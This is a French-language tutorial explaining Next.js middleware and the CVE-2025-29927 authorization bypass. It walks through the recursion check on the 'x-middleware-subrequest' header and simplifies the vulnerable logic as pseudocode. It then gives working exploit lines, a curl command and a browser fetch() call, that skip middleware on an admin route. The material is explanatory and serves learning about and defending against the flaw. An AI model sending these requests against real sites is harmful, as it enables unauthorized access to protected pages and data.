# Next.Js CVE

## <mark style="color:red;">Middleware Next.js et la vulnérabilité</mark>

### <mark style="color:blue;">C'est quoi un Middleware dans Next.js ?</mark>

#### <mark style="color:green;">Le concept de base</mark>

Imagine un **gardien à l'entrée d'un bâtiment**. Avant que quelqu'un puisse entrer dans n'importe quelle pièce, il doit passer devant ce gardien qui vérifie son badge.

**Le Middleware Next.js, c'est exactement ça** : un gardien qui s'exécute **AVANT** que ta page ne s'affiche.

#### <mark style="color:green;">Exemple concret sans code</mark>

Tu as un site avec :

* Une page d'accueil (accessible à tous)
* Une page admin (réservée aux admins)
* Une page profil (réservée aux utilisateurs connectés)

**Sans middleware :**

```
Visiteur → Clique sur /admin → Page admin s'affiche directement
```

Problème : N'importe qui peut accéder à la page admin !

**Avec middleware :**

```
Visiteur → Clique sur /admin → Middleware vérifie : "Es-tu admin ?"
  → Non ? → Redirige vers login
  → Oui ? → Laisse passer vers la page admin
```

***

### <mark style="color:red;">Comment fonctionne le Middleware Next.js ?</mark>

#### <mark style="color:green;">Le cycle de vie d'une requête</mark>

Quand quelqu'un visite ton site Next.js :

```
1. Navigateur envoie une requête
   ↓
2. Next.js reçoit la requête
   ↓
3. 🛡️ MIDDLEWARE s'exécute (si configuré)
   ↓
4. Le middleware décide :
   - Laisser passer (autoriser)
   - Bloquer (rediriger ou erreur)
   - Modifier la requête
   ↓
5. Si autorisé → La page s'affiche
```

#### <mark style="color:green;">Un exemple de Middleware simple</mark>

Créons un fichier `middleware.js` à la racine du projet :

```javascript
import { NextResponse } from 'next/server'

export function middleware(request) {
  // Je récupère l'URL demandée
  const url = request.nextUrl.pathname
  
  // Si quelqu'un veut accéder à /admin
  if (url.startsWith('/admin')) {
    
    // Je vérifie s'il a un cookie "isAdmin"
    const isAdmin = request.cookies.get('isAdmin')
    
    // Si pas admin → je bloque !
    if (!isAdmin || isAdmin.value !== 'true') {
      console.log("❌ Accès refusé : pas admin")
      return NextResponse.redirect(new URL('/login', request.url))
    }
    
    // Si admin → je laisse passer
    console.log("✅ Accès autorisé : c'est un admin")
    return NextResponse.next()
  }
  
  // Pour toutes les autres pages, je laisse passer
  return NextResponse.next()
}
```

**Ce qui se passe :**

* `NextResponse.next()` = "Laisse passer, continue vers la page"
* `NextResponse.redirect()` = "Non, redirige ailleurs"

#### <mark style="color:green;">Configuration : quelles pages protéger ?</mark>

Tu peux dire au middleware "protège seulement certaines pages" :

```javascript
export const config = {
  matcher: ['/admin/:path*', '/dashboard/:path*']
}
```

Ici, le middleware ne s'active QUE pour :

* Toutes les pages commençant par `/admin/`
* Toutes les pages commençant par `/dashboard/`

***

### <mark style="color:blue;">Maintenant, la vulnérabilité CVE-2025-29927</mark>

#### <mark style="color:green;">Le problème : Next.js utilise un en-tête "secret" interne</mark>

Pour que le middleware fonctionne, Next.js utilise en interne un en-tête HTTP appelé `x-middleware-subrequest` pour gérer les appels récursifs.

**C'est quoi un appel récursif ?**

Parfois, un middleware peut avoir besoin d'appeler une autre fonction qui elle-même utilise le middleware. Pour éviter les boucles infinies, Next.js compte :

```
Appel 1 → Middleware s'exécute → x-middleware-subrequest: middleware
Appel 2 → Middleware s'exécute → x-middleware-subrequest: middleware:middleware
Appel 3 → Middleware s'exécute → x-middleware-subrequest: middleware:middleware:middleware
...
Appel 5 → STOP ! Trop de récursion, j'arrête
```

#### <mark style="color:green;">Le bug : Next.js fait confiance à cet en-tête</mark>

**Le problème :** Next.js pense que cet en-tête est **interne** et **sûr**. Mais en réalité, **n'importe qui peut l'envoyer** dans une requête HTTP !

#### <mark style="color:green;">Démonstration pas à pas</mark>

**Scénario 1 : Utilisation normale (sans attaque)**

```
1. Tu vas sur https://monsite.com/admin/dashboard

2. Ton navigateur envoie :
   GET /admin/dashboard HTTP/1.1
   Cookie: isAdmin=false

3. Le middleware Next.js s'exécute :
   - Vérifie le cookie
   - isAdmin = false
   - ❌ REFUSE l'accès
   - Redirige vers /login

4. Tu vois la page de connexion
```

**Scénario 2 : Avec l'attaque (en ajoutant l'en-tête magique)**

```
1. L'attaquant envoie (avec curl ou un outil) :
   GET /admin/dashboard HTTP/1.1
   Cookie: isAdmin=false
   x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

2. Next.js reçoit la requête et lit l'en-tête

3. Next.js voit "middleware" répété 5 fois

4. Next.js pense : "Oh ! Il y a eu 5 niveaux de récursion, 
   je dois arrêter pour éviter une boucle infinie"

5. 🚨 PROBLÈME : Au lieu de juste arrêter, Next.js dit :
   "Le middleware a déjà été traité, je passe directement à la page"

6. LE MIDDLEWARE NE S'EXÉCUTE JAMAIS ! ❌

7. La page /admin/dashboard s'affiche directement
   SANS vérifier si l'utilisateur est admin

8. ✅ L'attaquant accède à la page admin sans être admin !
```

### <mark style="color:green;">Visualisation avec un schéma</mark>

#### Fonctionnement normal

```
┌─────────────┐
│  Attaquant  │
└──────┬──────┘
       │
       │ GET /admin/dashboard
       │ Cookie: isAdmin=false
       ↓
┌──────────────────┐
│   Next.js        │
│  ┌────────────┐  │
│  │ Middleware │  │ ← S'exécute
│  │ Vérifie    │  │
│  │ Cookie     │  │
│  └─────┬──────┘  │
│        │         │
│        │ isAdmin=false
│        ↓         │
│    ❌ BLOQUÉ    │
└────────┬─────────┘
         │
         │ 401 Unauthorized
         ↓
    Page de login
```

#### <mark style="color:green;">Avec la vulnérabilité exploitée</mark>

```
┌─────────────┐
│  Attaquant  │
└──────┬──────┘
       │
       │ GET /admin/dashboard
       │ Cookie: isAdmin=false
       │ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
       ↓
┌──────────────────┐
│   Next.js        │
│  ┌────────────┐  │
│  │ Middleware │  │ ← NE S'EXÉCUTE PAS !
│  │ (contourné)│  │
│  └────────────┘  │
│                  │
│  Next.js lit     │
│  l'en-tête et    │
│  pense "5        │
│  récursions =    │
│  stop"           │
│                  │
│  ✅ PASSE        │
└────────┬─────────┘
         │
         │ 200 OK
         ↓
  📄 Page admin affichée
     (sans vérification !)
```

### <mark style="color:green;">Le code vulnérable expliqué simplement</mark>

```javascript
// Dans Next.js (version vulnérable)

// 1. Next.js récupère l'en-tête depuis la requête
const headerValue = request.headers['x-middleware-subrequest']
// Exemple: "middleware:middleware:middleware:middleware:middleware"

// 2. Il découpe par ":"
const parts = headerValue.split(':')
// Résultat: ["middleware", "middleware", "middleware", "middleware", "middleware"]

// 3. Il compte combien de fois "middleware" apparaît
let count = 0
for (let part of parts) {
  if (part === "middleware") {
    count = count + 1
  }
}
// Résultat: count = 5

// 4. Si count >= 5, il pense qu'il y a trop de récursion
if (count >= 5) {
  // 🚨 BUG ICI : Au lieu de bloquer, il saute le middleware !
  console.log("Trop de récursion détectée, je passe directement à la page")
  
  // Il envoie une réponse qui dit "middleware déjà traité"
  return ReponseSpeciale_QuiDit_MiddlewareDejaFait()
}

// 5. Normalement, le middleware devrait s'exécuter ici
// Mais à cause du bug, on n'arrive jamais ici !
verifier_si_utilisateur_est_admin() // ← Ne s'exécute JAMAIS
```

***

### <mark style="color:blue;">Pourquoi c'est grave ?</mark>

#### <mark style="color:green;">Facilité d'exploitation</mark>

Tu n'as besoin de **RIEN** de sophistiqué :

**Avec curl (ligne de commande) :**

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     https://site-victime.com/admin/dashboard
```

**Avec un navigateur (console développeur) :**

```javascript
fetch('/admin/dashboard', {
  headers: {
    'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'
  }
})
```

**Avec n'importe quel outil HTTP** (Postman, Insomnia, etc.)

#### <mark style="color:green;">Conséquences réelles</mark>

1. **Vol de données** : Accès aux pages admin avec toutes les données sensibles
2. **Modification** : Possibilité de créer/modifier/supprimer des données
3. **DoS** : Crash du site en empoisonnant le cache
4. **Aucune trace** : L'attaque ne laisse pas de logs suspects
